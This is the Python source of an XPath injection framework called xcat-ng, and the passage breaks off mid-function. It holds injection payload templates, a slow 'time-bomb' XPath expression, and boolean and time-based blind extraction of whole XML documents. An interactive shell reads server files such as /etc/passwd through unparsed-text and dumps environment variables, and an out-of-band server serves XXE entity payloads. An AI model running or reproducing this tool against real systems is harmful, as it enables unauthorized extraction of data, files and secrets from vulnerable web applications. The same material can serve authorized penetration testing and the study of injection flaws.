#!/usr/bin/env python3
"""
xcat-ng  —  Modern XPath Injection Framework
================================================

Usage:
    python xcat_ng_v3.py run      -r req.txt --true-string "Welcome"
    python xcat_ng_v3.py shell    -r req.txt --true-string "Welcome"
    python xcat_ng_v3.py detect   -r req.txt --true-string "Welcome"
    python xcat_ng_v3.py discover -r req.txt --true-string "Welcome"

    # Ручной режим (без Burp-файла):
    python xcat_ng_v3.py run --url http://host/page --param search --param-value test \
                              --true-string "Found" --method GET
"""

from __future__ import annotations

import asyncio
import hashlib
import importlib.util
import json
import math
import os
import re
import readline
import shlex
import statistics
import sys
from collections import Counter
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

import difflib
import argparse

try:
    import httpx
except ImportError:
    sys.exit("pip install httpx")

# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────

DEFAULT_TIMEOUT   = 15
DEFAULT_RETRIES   = 3
BASELINE_SAMPLES  = 5
DEFAULT_CONCURRENCY = 10
FAST_MODE_CHARS   = 15
MISSING_CHAR      = "?"

ASCII_SEARCH_SPACE = (
    "etaoinshrdlcumwfgypbvkjxqz"
    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    "0123456789_@.-: +./:()!,{}"
)

# XPath «time-bomb» — вычисляется долго
TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"

# ─────────────────────────────────────────────
# ENUMS / MODES
# ─────────────────────────────────────────────

class Mode(str, Enum):
    SAFE       = "safe"
    AGGRESSIVE = "aggressive"

class ExtractionMethod(str, Enum):
    BOOLEAN = "boolean"
    TIME    = "time"
    NORMAL  = "normal"

# ─────────────────────────────────────────────
# UTILS
# ─────────────────────────────────────────────

def entropy(text: str) -> float:
    if not text:
        return 0.0
    freq: Dict[str, int] = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    e = 0.0
    n = len(text)
    for v in freq.values():
        p = v / n
        e -= p * math.log2(p)
    return e


def profile(text: str) -> dict:
    return {
        "len":     len(text),
        "entropy": entropy(text),
        "hash":    hashlib.sha256(text.encode(errors="ignore")).hexdigest(),
    }


def similarity(a: str, b: str) -> float:
    return difflib.SequenceMatcher(None, a, b).ratio()


def _color(text: str, code: int) -> str:
    """ANSI colour (skipped if not a tty)."""
    if not sys.stdout.isatty():
        return text
    return f"\033[{code}m{text}\033[0m"

def green(t):  return _color(t, 32)
def red(t):    return _color(t, 31)
def yellow(t): return _color(t, 33)
def cyan(t):   return _color(t, 36)
def bold(t):   return _color(t, 1)

# ─────────────────────────────────────────────
# REQUEST PARSING
# ─────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method:  str
    url:     str
    headers: Dict[str, str]
    query:   Dict[str, str]
    body:    Dict[str, str]

    @classmethod
    def from_burp(cls, path: str) -> "ParsedRequest":
        raw   = open(path, "r", errors="ignore").read()
        lines = raw.splitlines()

        first = lines[0].split()
        method, path_qs = first[0], first[1]

        headers: Dict[str, str] = {}
        i = 1
        while i < len(lines) and lines[i].strip():
            if ":" in lines[i]:
                k, v = lines[i].split(":", 1)
                headers[k.strip()] = v.strip()
            i += 1

        body_raw = "\n".join(lines[i + 1:]).strip()
        host     = headers.get("Host", "localhost")
        scheme   = "https" if "443" in host else "http"
        full_url = f"{scheme}://{host}{path_qs}"

        parsed = urlparse(full_url)
        query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        body   = {k: v[0] for k, v in parse_qs(body_raw, keep_blank_values=True).items()}
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        return cls(method=method, url=base, headers=headers, query=query, body=body)

    @classmethod
    def from_args(cls, url: str, method: str, params: Dict[str, str],
                  headers: Dict[str, str], body: Dict[str, str]) -> "ParsedRequest":
        parsed = urlparse(url)
        query  = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
        query.update(params)
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return cls(method=method, url=base, headers=headers, query=query, body=body)

    @property
    def all_params(self) -> Dict[str, str]:
        return {**self.query, **self.body}

# ─────────────────────────────────────────────
# INJECTION TEMPLATES
# ─────────────────────────────────────────────

@dataclass
class Injector:
    name:            str
    example:         str
    # (payload_template_true, payload_template_false)
    test_true_tmpl:  str
    test_false_tmpl: str
    # template for injecting an XPath expression
    expr_tmpl:       str  # use {working} and {expression}
    # OR callable(working, expression) -> str
    expr_fn:         Optional[Callable[[str, str], str]] = None

    def build(self, working: str, expression: str) -> str:
        if self.expr_fn:
            return self.expr_fn(working, expression)
        return self.expr_tmpl.format(working=working, expression=expression)

    def test_payloads(self, working: str) -> List[Tuple[str, bool]]:
        return [
            (self.test_true_tmpl.format(working=working),  True),
            (self.test_false_tmpl.format(working=working), False),
        ]


INJECTORS: List[Injector] = [
    Injector(
        name="integer",
        example="/lib/book[id=?]",
        test_true_tmpl="{working} and 1=1",
        test_false_tmpl="{working} and 1=2",
        expr_tmpl="{working} and {expression}",
    ),
    Injector(
        name="string - single quote",
        example="/lib/book[name='?']",
        test_true_tmpl="{working}' and '1'='1",
        test_false_tmpl="{working}' and '1'='2",
        expr_tmpl="{working}' and {expression} and '1'='1",
    ),
    Injector(
        name="string - double quote",
        example='/lib/book[name="?"]',
        test_true_tmpl='{working}" and "1"="1',
        test_false_tmpl='{working}" and "1"="2',
        expr_tmpl='{working}" and {expression} and "1"="1',
    ),
    Injector(
        name="attribute name - prefix",
        example="/lib/book[?=value]",
        test_true_tmpl="1=1 and {working}",
        test_false_tmpl="1=2 and {working}",
        expr_fn=lambda w, e: f"{e} and {w}",
    ),
    Injector(
        name="attribute name - postfix",
        example="/lib/book[?=value]",
        test_true_tmpl="{working} and not 1=2 and {working}",
        test_false_tmpl="{working} and 1=2 and {working}",
        expr_fn=lambda w, e: f"{w} and {e} and {w}",
    ),
    Injector(
        name="element name - prefix",
        example="/lib/something?/",
        test_true_tmpl=".[true()]/{working}",
        test_false_tmpl=".[false()]/{working}",
        expr_fn=lambda w, e: f".[{e}]/{w}",
    ),
    Injector(
        name="element name - postfix",
        example="/lib/?something",
        test_true_tmpl="{working}[true()]",
        test_false_tmpl="{working}[false()]",
        expr_fn=lambda w, e: f"{w}[{e}]",
    ),
    Injector(
        name="function call - last string parameter - single quote",
        example="/lib/something[function(?)]",
        test_true_tmpl="{working}') and true() and string('1'='1",
        test_false_tmpl="{working}') and false() and string('1'='1",
        expr_tmpl="{working}') and {expression} and string('1'='1",
    ),
    Injector(
        name="function call - last string parameter - double quote",
        example='/lib/something[function(?)]',
        test_true_tmpl='{working}") and true() and string("1"="1',
        test_false_tmpl='{working}") and false() and string("1"="1',
        expr_tmpl='{working}") and {expression} and string("1"="1',
    ),
    Injector(
        name="other elements - last string parameter - double quote",
        example='/lib/something[function(?) and false()] | //*[?]',
        test_true_tmpl='{working}") and false()] | //*[true() and string("1"="1',
        test_false_tmpl='{working}") and false()] | //*[false() and string("1"="1',
        expr_fn=lambda w, e: f'{w}") and false()] | //*[{e} and string("1"="1',
    ),
]

# ─────────────────────────────────────────────
# FEATURES
# ─────────────────────────────────────────────

FEATURES = [
    ("xpath-2",               "lower-case('A')='a'"),
    ("xpath-3",               "boolean(generate-id(/))"),
    ("normalize-space",       "normalize-space('  a  b ')='a b'"),
    ("substring-search",      f"string-length(substring-before('{ASCII_SEARCH_SPACE[:10]}','h'))>0"),
    ("codepoint-search",      "string-to-codepoints('t')[1]=116"),
    ("environment-variables", "exists(available-environment-variables())"),
    ("document-uri",          "document-uri(/)"),
    ("base-uri",              "base-uri()"),
    ("current-datetime",      "string(current-dateTime())"),
    ("unparsed-text",         "unparsed-text-available(document-uri(/))"),
    ("doc-function",          "doc-available(document-uri(/))"),
    ("linux",                 "unparsed-text-available('/etc/passwd')"),
]

# ─────────────────────────────────────────────
# ATTACK CONTEXT
# ─────────────────────────────────────────────

@dataclass
class AttackContext:
    req:            ParsedRequest
    target_param:   str
    match_fn:       Callable[[int, str], bool]   # (status, body) -> bool
    mode:           Mode
    concurrency:    int
    fast_mode:      bool
    injector:       Optional[Injector]
    tamper_fn:      Optional[Callable]
    oob_host:       Optional[str]
    timeout:        int
    proxy:          Optional[str]

    features:          Dict[str, bool] = field(default_factory=dict)
    common_strings:    Counter         = field(default_factory=Counter)
    common_characters: Counter         = field(default_factory=Counter)

    _client:    Optional[httpx.AsyncClient] = field(default=None, repr=False)
    _semaphore: Optional[asyncio.Semaphore] = field(default=None, repr=False)

    def __post_init__(self):
        self._semaphore = asyncio.Semaphore(self.concurrency)

    async def start(self):
        proxies = {"all://": self.proxy} if self.proxy else None
        self._client = httpx.AsyncClient(
            timeout=self.timeout,
            verify=False,
            proxies=proxies,
        )

    async def close(self):
        if self._client:
            await self._client.aclose()

    @property
    def working_value(self) -> str:
        return self.req.all_params.get(self.target_param, "")

    def inject(self, expression: str) -> str:
        if self.injector:
            return self.injector.build(self.working_value, expression)
        return expression

# ─────────────────────────────────────────────
# HTTP ENGINE
# ─────────────────────────────────────────────

class Engine:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx

    async def send_raw(self, overrides: Dict[str, str]) -> Tuple[int, str, float]:
        """Send a request with parameter overrides. Returns (status, body, elapsed)."""
        ctx = self.ctx
        req = ctx.req

        q = dict(req.query)
        b = dict(req.body)

        for k, v in overrides.items():
            if k in q:
                q[k] = v
            if k in b:
                b[k] = v

        # cache-buster
        import random
        q["_xcng"] = str(random.randint(100000, 999999))

        args: Dict[str, Any] = dict(
            method=req.method,
            url=req.url,
            params=q if req.method.upper() in ("GET", "DELETE") else None,
            data=b if req.method.upper() in ("POST", "PUT", "PATCH") else None,
            headers=req.headers,
        )

        if ctx.tamper_fn:
            ctx.tamper_fn(ctx, args)

        async with ctx._semaphore:
            try:
                r = await ctx._client.request(**args)
                if r.status_code == 429:
                    await asyncio.sleep(3)
                    r = await ctx._client.request(**args)
                return r.status_code, r.text, r.elapsed.total_seconds()
            except Exception as exc:
                print(f"  [!] Request error: {exc}", file=sys.stderr)
                return 0, "", 0.0

    async def send_expr(self, xpath_expr: str) -> Tuple[int, str, float]:
        """Inject an XPath expression into the target parameter."""
        payload = self.ctx.inject(xpath_expr)
        return await self.send_raw({self.ctx.target_param: payload})

    async def check(self, xpath_expr: str) -> bool:
        """Boolean oracle: does the injected expression evaluate to true?"""
        status, body, _ = await self.send_expr(xpath_expr)
        return self.ctx.match_fn(status, body)

    async def baseline(self) -> Tuple[int, str]:
        status, body, _ = await self.send_raw({})
        return status, body

# ─────────────────────────────────────────────
# BASELINE PROFILING
# ─────────────────────────────────────────────

async def build_baseline(engine: Engine, n: int = BASELINE_SAMPLES) -> List[str]:
    samples = []
    for _ in range(n):
        _, body = await engine.baseline()
        samples.append(body)
    return samples

# ─────────────────────────────────────────────
# AUTO DETECTION: BOOLEAN / TIME / NORMAL
# ─────────────────────────────────────────────

async def detect_injection_type(
    engine: Engine, param: str, baseline_bodies: List[str]
) -> Optional[Tuple[ExtractionMethod, Injector]]:
    """
    Перебирает все INJECTORS и пробует каждый на param.
    Возвращает (метод, инжектор) или None.
    """
    req = engine.ctx.req
    working = req.all_params.get(param, "")

    for inj in INJECTORS:
        payloads = inj.test_payloads(working)
        if len(payloads) < 2:
            continue

        true_payload,  _ = payloads[0]
        false_payload, _ = payloads[1]

        # --- Boolean check ---
        _, h_true,  _ = await engine.send_raw({param: true_payload})
        _, h_false, _ = await engine.send_raw({param: false_payload})

        score = 0
        if abs(len(h_true) - len(h_false)) > 5:                          score += 1
        if abs(entropy(h_true) - entropy(h_false)) > 0.3:                score += 1
        if profile(h_true)["hash"] != profile(h_false)["hash"]:          score += 1
        sim_true  = sum(similarity(b, h_true)  for b in baseline_bodies) / len(baseline_bodies)
        sim_false = sum(similarity(b, h_false) for b in baseline_bodies) / len(baseline_bodies)
        if sim_true > sim_false + 0.07:                                   score += 1

        if score >= 2:
            print(f"  [+] Boolean injection: {green(inj.name)}")
            return ExtractionMethod.BOOLEAN, inj

        # --- NORMAL check (true payload returns richer content than baseline) ---
        avg_base_len = statistics.mean(len(b) for b in baseline_bodies)
        if len(h_true) > avg_base_len * 1.1:
            print(f"  [+] Normal (content) injection: {green(inj.name)}")
            return ExtractionMethod.NORMAL, inj

        # --- Time check ---
        bomb_payload = true_payload.replace("1=1", f"1=1 and {TIME_BOMB}>0")
        times_true, times_false = [], []
        for _ in range(3):
            _, _, t = await engine.send_raw({param: bomb_payload})
            times_true.append(t)
            _, _, t = await engine.send_raw({param: false_payload})
            times_false.append(t)

        mean_t = statistics.mean(times_true)
        mean_f = statistics.mean(times_false)
        std_f  = statistics.pstdev(times_false) or 0.001
        z      = (mean_t - mean_f) / std_f

        if z > 3:
            print(f"  [+] Time-based injection: {green(inj.name)}")
            return ExtractionMethod.TIME, inj

    return None


async def auto_discover(engine: Engine, baseline_bodies: List[str]) -> Optional[Tuple[str, ExtractionMethod, Injector]]:
    """Перебрать все параметры и найти уязвимый."""
    all_params = engine.ctx.req.all_params
    # Эвристическая сортировка: строки без цифр — первыми
    ranked = sorted(all_params.keys(), key=lambda k: (all_params[k].isdigit(), -len(all_params[k])))

    for param in ranked:
        print(f"[*] Probing param: {cyan(param)}")
        result = await detect_injection_type(engine, param, baseline_bodies)
        if result:
            method, inj = result
            return param, method, inj
    return None

# ─────────────────────────────────────────────
# FEATURES DETECTION
# ─────────────────────────────────────────────

async def detect_features(engine: Engine) -> Dict[str, bool]:
    results: Dict[str, bool] = {}
    for name, xpath_test in FEATURES:
        ok = await engine.check(xpath_test)
        results[name] = ok
        icon = green("✓") if ok else red("✗")
        print(f"  {icon} {name}")
    return results

# ─────────────────────────────────────────────
# BINARY SEARCH
# ─────────────────────────────────────────────

async def binary_search(engine: Engine, count_expr: str, lo: int = 0, hi: int = 50) -> int:
    """Binary-search the integer value of count_expr."""
    # Expand hi if needed
    if await engine.check(f"{count_expr} > {hi}"):
        return await binary_search(engine, count_expr, lo, hi * 2)
    while lo <= hi:
        mid = (lo + hi) // 2
        if await engine.check(f"{count_expr} < {mid}"):
            hi = mid - 1
        elif await engine.check(f"{count_expr} > {mid}"):
            lo = mid + 1
        else:
            return mid
    return -1

# ─────────────────────────────────────────────
# CHARACTER EXTRACTION
# ─────────────────────────────────────────────

async def get_char_codepoint(engine: Engine, expr: str) -> Optional[str]:
    code = await binary_search(engine, f"string-to-codepoints({expr})[1]", lo=0, hi=127)
    return chr(code) if code > 0 else None


async def get_char_substring(engine: Engine, expr: str) -> Optional[str]:
    space = ASCII_SEARCH_SPACE
    # Check first char explicitly (substring-before edge case)
    if await engine.check(f"{expr}='{space[0]}'"):
        return space[0]
    idx = await binary_search(engine, f"string-length(substring-before('{space}',{expr}))",
                              lo=0, hi=len(space))
    return space[idx] if 0 < idx < len(space) else None


async def get_char_linear(engine: Engine, expr: str, charset: Counter) -> Optional[str]:
    """Linear scan with adaptive ordering."""
    ordered = [c for c, _ in charset.most_common()] + \
              [c for c in ASCII_SEARCH_SPACE if c not in charset]
    for ch in ordered:
        safe = ch.replace("'", "\\'")
        if await engine.check(f"substring({expr},1,1)='{safe}'"):
            charset[ch] += 1
            return ch
    return None


async def get_char(engine: Engine, expr: str) -> Optional[str]:
    """Choose best strategy based on detected features."""
    feats = engine.ctx.features
    if feats.get("codepoint-search"):
        return await get_char_codepoint(engine, expr)
    elif feats.get("substring-search"):
        return await get_char_substring(engine, expr)
    else:
        return await get_char_linear(engine, expr, engine.ctx.common_characters)

# ─────────────────────────────────────────────
# STRING EXTRACTION
# ─────────────────────────────────────────────

async def get_string_length(engine: Engine, expr: str) -> int:
    return await binary_search(engine, f"string-length({expr})", lo=0, hi=50)


async def get_string_boolean(engine: Engine, expr: str, fast: bool = False) -> str:
    """Extract a string char-by-char via boolean oracle."""
    feats = engine.ctx.features
    if feats.get("normalize-space"):
        expr = f"normalize-space({expr})"

    total = await get_string_length(engine, expr)
    if total <= 0:
        return ""

    # Try common strings first
    ctx = engine.ctx
    candidates = [s for s, _ in ctx.common_strings.most_common() if len(s) == total][:5]
    if candidates:
        checks = await asyncio.gather(*[engine.check(f"{expr}='{c}'") for c in candidates])
        for ok, s in zip(checks, candidates):
            if ok:
                ctx.common_strings[s] += 1
                return s

    fetch_len = min(FAST_MODE_CHARS, total) if fast else total
    futures   = [get_char(engine, f"substring({expr},{i},1)") for i in range(1, fetch_len + 1)]
    chars     = await asyncio.gather(*futures)

    result = "".join(c if c else MISSING_CHAR for c in chars)

    if fast and fetch_len < total:
        result += f"... ({total - fetch_len} more)"
    elif total <= 10:
        ctx.common_strings[result] += 1

    return result

# ─────────────────────────────────────────────
# NORMAL EXTRACTION  (regex / diff)
# ─────────────────────────────────────────────

async def extract_normal(
    engine: Engine, param: str, injector: Injector,
    patterns: Optional[List[str]] = None
) -> Optional[str]:
    """
    NORMAL mode: отправляем «всегда-true» payload и пытаемся вытащить
    значение из ответа через regex или diff с baseline.
    """
    working = engine.ctx.req.all_params.get(param, "")
    true_pl, _ = injector.test_payloads(working)[0]
    _, base_body   = await engine.baseline()
    _, true_body, _ = await engine.send_raw({param: true_pl})

    # 1) Пользовательские паттерны
    if patterns:
        for pat in patterns:
            m = re.search(pat, true_body)
            if m:
                return m.group(1) if m.lastindex else m.group(0)

    # 2) Автоматические паттерны (XML-теги, JSON-строки, HTML-значения)
    auto_patterns = [
        r"<value[^>]*>([^<]+)</value>",
        r"<result[^>]*>([^<]+)</result>",
        r"<text[^>]*>([^<]+)</text>",
        r'"result"\s*:\s*"([^"]+)"',
        r'"value"\s*:\s*"([^"]+)"',
    ]
    for pat in auto_patterns:
        m = re.search(pat, true_body, re.IGNORECASE)
        if m:
            return m.group(1)

    # 3) Diff: найти строки, присутствующие в true, но не в baseline
    base_lines = set(base_body.splitlines())
    extra      = [l.strip() for l in true_body.splitlines()
                  if l.strip() and l.strip() not in base_lines]
    if extra:
        return "\n".join(extra[:10])

    return None

# ─────────────────────────────────────────────
# TIME-BASED STRING EXTRACTION
# ─────────────────────────────────────────────

async def get_string_time(engine: Engine, expr: str, threshold: float, fast: bool = False) -> str:
    """Extract a string via time-based oracle."""
    total = 0
    # Estimate length via time-bomb
    for length in range(1, 65):
        bomb = f"string-length({expr}) >= {length} and {TIME_BOMB}>0"
        _, _, t = await engine.send_expr(bomb)
        if t < threshold:
            total = length - 1
            break
    if total == 0:
        total = 10  # fallback

    fetch_len = min(FAST_MODE_CHARS, total) if fast else total
    result    = []

    for pos in range(1, fetch_len + 1):
        found = False
        for ch in ASCII_SEARCH_SPACE:
            safe = ch.replace("'", "\\'")
            bomb = f"substring({expr},{pos},1)='{safe}' and {TIME_BOMB}>0"
            _, _, t = await engine.send_expr(bomb)
            if t >= threshold:
                result.append(ch)
                found = True
                break
        if not found:
            result.append(MISSING_CHAR)

    s = "".join(result)
    if fast and fetch_len < total:
        s += f"... ({total - fetch_len} more)"
    return s

# ─────────────────────────────────────────────
# BFS XML TRAVERSAL
# ─────────────────────────────────────────────

@dataclass
class XMLNode:
    name:       str
    attributes: Dict[str, str]
    text:       str
    children:   List["XMLNode"] = field(default_factory=list)
    comments:   List[str]       = field(default_factory=list)


async def get_node_count(engine: Engine, path_expr: str) -> int:
    return await binary_search(engine, f"count({path_expr})", lo=0)


async def get_node_attrib_count(engine: Engine, path_expr: str) -> int:
    return await binary_search(engine, f"count({path_expr}/@*)", lo=0)


async def get_nodes_bfs(engine: Engine, root_expr: str = "/*", depth: int = 0, max_depth: int = 10) -> List[XMLNode]:
    """
    BFS-обход XML-дерева начиная с root_expr.
    Для каждого узла извлекает: name, attrs, text, children.
    """
    if depth > max_depth:
        return []

    nodes: List[XMLNode] = []

    node_count = await get_node_count(engine, root_expr)
    if node_count < 0:
        node_count = 1  # хотя бы один

    for i in range(1, node_count + 1):
        path = f"({root_expr})[{i}]" if node_count > 1 else root_expr

        # node name
        name = await get_string_boolean(engine, f"name({path})", fast=False)

        # attributes
        attrs: Dict[str, str] = {}
        attr_count = await get_node_attrib_count(engine, path)
        for ai in range(1, attr_count + 1):
            attr_path = f"{path}/@*[{ai}]"
            aname  = await get_string_boolean(engine, f"name({attr_path})")
            avalue = await get_string_boolean(engine, f"string({attr_path})")
            if aname:
                attrs[aname] = avalue

        # text content
        text_parts = []
        text_count = await binary_search(engine, f"count({path}/text())", lo=0)
        for ti in range(1, text_count + 1):
            t = await get_string_boolean(engine, f"string({path}/text()[{ti}])")
            text_parts.append(t)
        text = "".join(text_parts).strip()

        # children — recurse
        child_count = await binary_search(engine, f"count({path}/*)", lo=0)
        children: List[XMLNode] = []
        if child_count > 0:
            children = await get_nodes_bfs(engine, f"{path}/*", depth + 1, max_depth)

        nodes.append(XMLNode(name=name or f"node{i}", attributes=attrs, text=text, children=children))

    return nodes


def print_xml_tree(nodes: List[XMLNode], indent: int = 0) -> None:
    pad = "  " * indent
    for node in nodes:
        attr_str = " ".join(f'{k}="{v}"' for k, v in node.attributes.items())
        open_tag = f"<{node.name}{' ' + attr_str if attr_str else ''}>"
        print(f"{pad}{green(open_tag)}")
        if node.text:
            print(f"{pad}  {node.text}")
        for child in node.children:
            print_xml_tree([child], indent + 1)
        print(f"{pad}{green('</' + node.name + '>')}")

# ─────────────────────────────────────────────
# OOB SERVER
# ─────────────────────────────────────────────

try:
    from aiohttp import web as aio_web

    ENTITY_TPL = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies {0}>]>'
        '<data>&goodies;</data>'
    )

    _OOB_EXPECTATIONS: Dict[str, asyncio.Future] = {}
    _OOB_ENTITY_VALS:  Dict[str, str]            = {}
    _OOB_TEST_VALUE    = str(__import__("random").randint(1, 999999))

    async def _oob_test(req: aio_web.Request) -> aio_web.Response:
        return aio_web.Response(body=f"<data>{_OOB_TEST_VALUE}</data>", content_type="text/xml")

    async def _oob_data(req: aio_web.Request) -> aio_web.Response:
        eid = req.match_info["id"]
        if eid not in _OOB_EXPECTATIONS:
            return aio_web.Response(status=404)
        data = req.rel_url.query_string
        if data.startswith("d="):
            data = __import__("urllib.parse", fromlist=["unquote"]).unquote(data[2:])
        fut = _OOB_EXPECTATIONS[eid]
        if not fut.done():
            fut.set_result(data)
        return aio_web.Response(body=f"<data>{_OOB_TEST_VALUE}</data>", content_type="text/xml")

    async def _oob_entity(req: aio_web.Request) -> aio_web.Response:
        eid = req.match_info["id"]
        if eid not in _OOB_ENTITY_VALS:
            return aio_web.Response(status=404)
        val  = _OOB_ENTITY_VALS[eid]
        body = ENTITY_TPL.format(val)
        return aio_web.Response(body=body, content_type="text/xml")

    def _create_oob_app() -> aio_web.Application:
        app = aio_web.Application()
        app.router.add_get("/test/data",   _oob_test)
        app.router.add_get("/data/{id}",   _oob_data)
        app.router.add_get("/entity/{id}", _oob_entity)
        return app

    async def start_oob_server(host: str, port: int):
        app    = _create_oob_app()
        runner = aio_web.AppRunner(app)
        await runner.setup()
        site   = aio_web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        print(f"[OOB] Listening on 0.0.0.0:{port}, external: {host}:{port}")
        return runner

    HAS_OOB = True
except ImportError:
    HAS_OOB = False
    print("[!] aiohttp not installed — OOB server disabled (pip install aiohttp)", file=sys.stderr)

# ─────────────────────────────────────────────
# INTERACTIVE SHELL
# ─────────────────────────────────────────────

class Shell:
    def __init__(self, engine: Engine):
        self.engine = engine
        self.ctx    = engine.ctx
        self._cmds: Dict[str, Callable] = {
            "get":        self.cmd_get,
            "get-string": self.cmd_get_string,
            "cat":        self.cmd_cat,
            "env":        self.cmd_env,
            "pwd":        self.cmd_pwd,
            "time":       self.cmd_time,
            "find":       self.cmd_find,
            "features":   self.cmd_features,
            "toggle":     self.cmd_toggle,
            "help":       self.cmd_help,
            "exit":       self.cmd_exit,
            "quit":       self.cmd_exit,
        }

    async def run(self):
        print(bold("\nxcat-ng shell  —  type 'help' for commands\n"))
        while True:
            try:
                line = input(f"{red('XCat')} {green('$')} ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if not line:
                continue
            parts = shlex.split(line)
            cmd, args = parts[0], parts[1:]
            if cmd not in self._cmds:
                print(f"Unknown command '{cmd}'. Try 'help'.")
                continue
            try:
                await self._cmds[cmd](args)
            except Exception as exc:
                print(f"Error: {exc}")

    async def cmd_help(self, _):
        for name, fn in self._cmds.items():
            doc = (fn.__doc__ or "").strip().split("\n")[0]
            print(f"  {green(name):20s} {doc}")

    async def cmd_exit(self, _):
        """Exit the shell."""
        sys.exit(0)

    async def cmd_get(self, args):
        """[xpath]  BFS-traverse and print XML node tree."""
        expr = args[0] if args else "/*"
        nodes = await get_nodes_bfs(self.engine, expr)
        print_xml_tree(nodes)

    async def cmd_get_string(self, args):
        """[xpath]  Evaluate XPath and return a string."""
        if not args:
            print("Usage: get-string [xpath]")
            return
        val = await get_string_boolean(self.engine, args[0], self.ctx.fast_mode)
        print(val)

    async def cmd_cat(self, args):
        """[path]  Read a text file via unparsed-text."""
        if not self.ctx.features.get("unparsed-text"):
            print(red("Feature 'unparsed-text' not available"))
            return
        path = args[0] if args else "doc"
        expr = f"unparsed-text('{path}')"
        print(await get_string_boolean(self.engine, expr))

    async def cmd_env(self, _):
        """List environment variables."""
        if not self.ctx.features.get("environment-variables"):
            print(red("Feature 'environment-variables' not available"))
            return
        count = await binary_search(self.engine, "count(available-environment-variables())", lo=0)
        for i in range(1, count + 1):
            name_expr = f"available-environment-variables()[{i}]"
            name = await get_string_boolean(self.engine, name_expr)
            val  = await get_string_boolean(self.engine, f"environment-variable('{name}')")
            print(f"{green(name)}={val}")

    async def cmd_pwd(self, _):
        """Print working directory (document-uri / base-uri)."""
        if self.ctx.features.get("base-uri"):
            expr = "base-uri()"
        elif self.ctx.features.get("document-uri"):
            expr = "document-uri(/)"
        else:
            print(red("Neither base-uri nor document-uri available"))
            return
        print(await get_string_boolean(self.engine, expr))

    async def cmd_time(self, _):
        """Print server date/time."""
        if not self.ctx.features.get("current-datetime"):
            print(red("Feature 'current-datetime' not available"))
            return
        print(await get_string_boolean(self.engine, "string(current-dateTime())"))

    async def cmd_find(self, args):
        """[name]  Search for file by name in parent directories."""
        if not args:
            print("Usage: find [filename]")
            return
        name = args[0]
        for i in range(10):
            rel = ("../" * i) + name
            if self.ctx.features.get("doc-function"):
                if await self.engine.check(f"doc-available(resolve-uri('{rel}', document-uri(/)))"):
                    print(green(f"[XML] {rel}"))
            if self.ctx.features.get("unparsed-text"):
                if await self.engine.check(f"unparsed-text-available(resolve-uri('{rel}', document-uri(/)))"):
                    print(green(f"[TXT] {rel}"))

    async def cmd_features(self, _):
        """Show detected features."""
        for k, v in self.ctx.features.items():
            icon = green("on") if v else red("off")
            print(f"  {k:30s} {icon}")

    async def cmd_toggle(self, args):
        """[feature]  Toggle a feature on/off."""
        if not args:
            await self.cmd_features([])
            return
        feat = args[0]
        self.ctx.features[feat] = not self.ctx.features.get(feat, False)
        print(f"{feat} → {green('on') if self.ctx.features[feat] else red('off')}")

# ─────────────────────────────────────────────
# CONFIDENCE TRACKER
# ─────────────────────────────────────────────

class Confidence:
    def __init__(self):
        self.ok   = 0
        self.fail = 0

    def update(self, ok: bool):
        if ok:
            self.ok   += 1
        else:
            self.fail += 1

    def score(self) -> float:
        total = self.ok + self.fail
        return self.ok / total if total else 0.0

    def __str__(self):
        return f"{self.score():.0%} ({self.ok}/{self.ok + self.fail})"

# ─────────────────────────────────────────────
# RESUME STATE
# ─────────────────────────────────────────────

class State:
    def __init__(self, path: Optional[str] = None):
        self.path = path
        self.data: Dict[str, Any] = {}
        if path and os.path.exists(path):
            with open(path) as f:
                self.data = json.load(f)
            print(f"[*] Resumed from {path}")

    def save(self):
        if self.path:
            with open(self.path, "w") as f:
                json.dump(self.data, f, indent=2)

# ─────────────────────────────────────────────
# MATCH FUNCTION BUILDERS
# ─────────────────────────────────────────────

def make_match_fn(
    true_string:  Optional[str] = None,
    false_string: Optional[str] = None,
    true_code:    Optional[int] = None,
    false_code:   Optional[int] = None,
) -> Callable[[int, str], bool]:

    def fn(status: int, body: str) -> bool:
        if true_code is not None and status != true_code:
            return False
        if false_code is not None and status == false_code:
            return False
        if true_string is not None and true_string not in body:
            return False
        if false_string is not None and false_string in body:
            return False
        return True

    return fn

# ─────────────────────────────────────────────
# HIGH-LEVEL ATTACK FLOW
# ─────────────────────────────────────────────

async def run_attack(ctx: AttackContext, state: State, output_xml: bool = True):
    """Main extraction: BFS XML traversal."""
    engine = Engine(ctx)
    await ctx.start()
    try:
        baseline_bodies = await build_baseline(engine)

        print(f"\n[*] Detecting features...")
        feats = await detect_features(engine)
        ctx.features.update(feats)

        root_expr = state.data.get("root_expr", "/*")
        print(f"\n[*] Extracting XML tree from {cyan(root_expr)}")
        nodes = await get_nodes_bfs(engine, root_expr)
        state.data["nodes_extracted"] = len(nodes)
        state.save()

        if output_xml:
            print()
            print_xml_tree(nodes)
    finally:
        await ctx.close()


async def run_shell(ctx: AttackContext):
    engine = Engine(ctx)
    await ctx.start()
    try:
        print("[*] Detecting features...")
        feats = await detect_features(engine)
        ctx.features.update(feats)
        shell = Shell(engine)
        await shell.run()
    finally:
        await ctx.close()


async def run_detect(ctx: AttackContext):
    engine = Engine(ctx)
    await ctx.start()
    try:
        print("[*] Testing injections on all parameters...")
        baseline_bodies = await build_baseline(engine)
        result = await auto_discover(engine, baseline_bodies)
        if result:
            param, method, inj = result
            print(f"\n{bold('Vulnerable parameter:')} {green(param)}")
            print(f"{bold('Method:')} {yellow(method.value)}")
            print(f"{bold('Injector:')} {yellow(inj.name)}")
            print(f"{bold('Example:')} {inj.example}")

            print("\n[*] Detecting features...")
            ctx.target_param = param
